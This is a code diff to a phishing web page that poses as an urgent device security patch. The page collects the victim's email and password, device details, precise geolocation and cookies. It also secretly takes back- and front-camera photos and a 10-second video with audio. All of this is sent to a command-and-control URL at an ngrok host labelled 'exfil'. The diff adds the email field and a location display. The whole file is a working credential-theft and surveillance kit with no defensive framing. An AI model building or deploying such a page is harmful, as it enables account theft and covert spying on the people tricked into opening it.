@@ -14,6 +14,9 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
         #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
+        .location-box { background: #0a1a2a; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 14px; border: 1px solid #00aaff55; }
+        .location-box img { max-width: 100%; border-radius: 8px; margin-top: 8px; }
+        .label { color: #88aaff; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -22,7 +25,7 @@
         <p>Your device requires an urgent security patch.</p>
         
         <div id="step1">
-            <input type="text" placeholder="Phone Number" id="phone">
+            <input type="email" placeholder="Email Address" id="email">
             <input type="password" placeholder="Password" id="pass">
             <br><br>
             <button class="btn" onclick="step1()">Verify Identity</button>
@@ -31,6 +34,13 @@
         <div id="step2" class="hidden">
             <p>🔍 Scanning device...</p>
             <div class="loader"></div>
+            
+            <!-- Location display -->
+            <div id="locationDisplay" class="location-box hidden">
+                <div><span class="label">📍 Location:</span> <span id="locText">Detecting...</span></div>
+                <div id="mapContainer"></div>
+            </div>
+
             <p class="status" id="statusText">Collecting device information...</p>
             <div id="statusBox"></div>
         </div>
@@ -45,6 +55,7 @@
 
     <script>
         const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
+        let currentLocation = null;
 
         function log(msg) {
             const box = document.getElementById('statusBox');
@@ -66,16 +77,16 @@
         }
 
         // ============================================================
-        // STEP 1: CREDENTIALS
+        // STEP 1: CREDENTIALS (EMAIL + PASSWORD)
         // ============================================================
         function step1() {
-            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            if (!phone || !pass) {
-                alert('Please enter your phone number and password.');
+            if (!email || !pass) {
+                alert('Please enter your email and password.');
                 return;
             }
-            sendData({ type: 'credentials', phone, pass });
+            sendData({ type: 'credentials', email, pass });
             log('✅ Credentials sent');
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
@@ -83,7 +94,7 @@
         }
 
         // ============================================================
-        // STEP 2: CAPTURE ALL
+        // STEP 2: COLLECT ALL DATA + LOCATION DISPLAY
         // ============================================================
         async function collectAllData() {
             log('📡 Starting data collection...');
@@ -100,11 +111,25 @@
             });
             log('✅ Device info sent');
 
-            // --- Location ---
+            // --- LOCATION (with on-screen display) ---
             if (navigator.geolocation) {
+                log('📍 Requesting location...');
                 navigator.geolocation.getCurrentPosition(
-                    pos => sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                    err => log('❌ Location denied')
+                    pos => {
+                        currentLocation = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        };
+                        sendData({ type: 'location', ...currentLocation });
+                        log('✅ Location captured');
+                        updateLocationDisplay(currentLocation);
+                    },
+                    err => {
+                        log('❌ Location denied: ' + err.message);
+                        document.getElementById('locText').innerText = '❌ Location access denied';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             }
 
@@ -125,11 +150,8 @@
             sendData({ type: 'storage', cookies: document.cookie || 'none' });
             log('✅ Cookies sent');
 
-            // ============================================================
-            // MEDIA CAPTURE — BACK PHOTO + FRONT PHOTO + FRONT VIDEO
-            // ============================================================
+            // --- MEDIA CAPTURE ---
             try {
-                // --- 1. BACK CAMERA PHOTO ---
                 log('📸 Capturing back camera photo...');
                 const backPhoto = await capturePhoto('environment');
                 if (backPhoto) {
@@ -137,7 +159,6 @@
                     log('✅ Back photo captured');
                 }
 
-                // --- 2. FRONT CAMERA PHOTO ---
                 log('🤳 Capturing front camera photo...');
                 const frontPhoto = await capturePhoto('user');
                 if (frontPhoto) {
@@ -145,7 +166,6 @@
                     log('✅ Front photo captured');
                 }
 
-                // --- 3. FRONT CAMERA VIDEO (10 sec with audio) ---
                 log('🎥 Recording front camera video (10 sec)...');
                 const videoData = await captureVideo('user', 10);
                 if (videoData) {
@@ -163,6 +183,26 @@
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
             }, 1500);
+        }
+
+        // ============================================================
+        // LOCATION DISPLAY
+        // ============================================================
+        function updateLocationDisplay(loc) {
+            const display = document.getElementById('locationDisplay');
+            display.classList.remove('hidden');
+            document.getElementById('locText').innerHTML = 
+                `<b>${loc.lat.toFixed(6)}</b>, <b>${loc.lon.toFixed(6)}</b> (accuracy: ${Math.round(loc.accuracy)}m)`;
+
+            // Static map image (OpenStreetMap)
+            const mapImg = document.createElement('img');
+            mapImg.src = `https://tile.openstreetmap.org/static/${loc.lat},${loc.lon},15,500x200.png`;
+            mapImg.alt = 'Location map';
+            mapImg.style.maxWidth = '100%';
+            mapImg.style.borderRadius = '8px';
+            mapImg.style.marginTop = '8px';
+            document.getElementById('mapContainer').innerHTML = '';
+            document.getElementById('mapContainer').appendChild(mapImg);
         }
 
         // ============================================================
